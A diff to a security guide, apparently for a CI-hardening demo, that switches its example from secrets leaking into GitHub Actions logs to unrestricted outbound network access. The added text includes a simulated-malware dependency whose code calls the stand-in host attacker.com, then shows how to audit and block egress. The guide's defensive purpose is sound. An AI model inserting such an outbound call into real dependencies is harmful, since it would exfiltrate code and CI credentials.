@@ -2,9 +2,8 @@
 
 ## Example Action: 
 Description:
-An example GitHub Actions workflow that inadvertently exposes sensitive information like secrets in the logs.
+An example GitHub Actions workflow that allows unrestricted outbound network access, potentially exposing source code and CI/CD credentials.
 
-Workflow YAML (.github/workflows/insecure-secret-exposure.yml):
 ```
 name: "Hosted: Network Monitoring with Harden-Runner"
 on:
@@ -32,45 +31,44 @@ jobs:
           workdir: ./src/exfiltration-demo
 ```
 
-Steps to Identify the Vulnerability:
-Review Workflow Files:
+Here src/package.json has following dependencies
+```
+  "dependencies": {
+    "@step-security/malware-simulator": "file:../malware-simulators/exfiltration-simulator"
+  },
+```
 
-Examine your .github/workflows directory for workflows that print or expose secrets.
-Look for commands like echo, print, or any other step that may inadvertently reveal sensitive information.
-Check for Secrets in Logs:
+And the malware-simulator is making a call to `https://attacker.com/`
+```
+https
+  .get("https://attacker.com/", (res) => {
+    // handle response
+  }
+```
 
-Run the workflow.
-Inspect the workflow logs for any lines that include secret values.
-Look for unintentional exposure of sensitive data.
-Steps to Mitigate the Vulnerability:
-Use Environment Variables:
+## Steps to Identify the Vulnerability:
+### Review Outbound Network Access:
+Use `step-security/harden-runner@v2` in your workflow and then Run the workflow.
+```
+- uses: step-security/harden-runner@v2
+  with:
+    egress-policy: audit
+```
 
-Refactor workflow steps to use environment variables instead of directly exposing secrets in commands.
-yaml
-Copy code
-- name: Print Secrets Safely
-  run: echo "Secret Value: ${{ env.MY_SECRET }}"
-  env:
-    MY_SECRET: ${{ secrets.MY_SECRET }}
-Mask Secret Values:
+After the workflow completes, check out the build logs. In the Harden-Runner step, you will see a link to security insights and recommendations.
 
-Utilize GitHub Actions add-mask to mask secret values in logs.
-yaml
-Copy code
-- name: Print Secrets Safely
-  run: echo "Secret Value: ${{ secrets.MY_SECRET }}"
-  env:
-    MY_SECRET: ${{ secrets.MY_SECRET }}
-- name: Mask Secret
-  run: echo "::add-mask::$MY_SECRET"
-  env:
-    MY_SECRET: ${{ secrets.MY_SECRET }}
-Regularly Review and Update:
+## Steps to Mitigate the Vulnerability:
+### Block calls to domains 
+Analyze the output of the Harden-Runner step, it will give you insight from where the calls to unwanted domains are happening. You can either choose to replace such code or you can choose to block calls to all domains except the allowed domains which you configure. You can do this configuration by changing the `step-security/harden-runner@v2` step as follow
+```
+- name: Harden Runner
+  uses: step-security/harden-runner@v2
+  with:
+    disable-sudo: true
+    egress-policy: block
+    allowed-endpoints: >
+      ghcr.io:443
+      github.com:443
+      registry.npmjs.org:443
+```
 
-Periodically review workflows for potential security issues.
-Stay informed about GitHub Actions best practices and security updates.
-Important Notes:
-Never Hardcode Secrets in Commands:
-Avoid directly using secret values in commands, as they may get exposed in logs.
-Regularly Monitor Logs:
-Regularly review workflow logs for any unintended exposure of sensitive information.
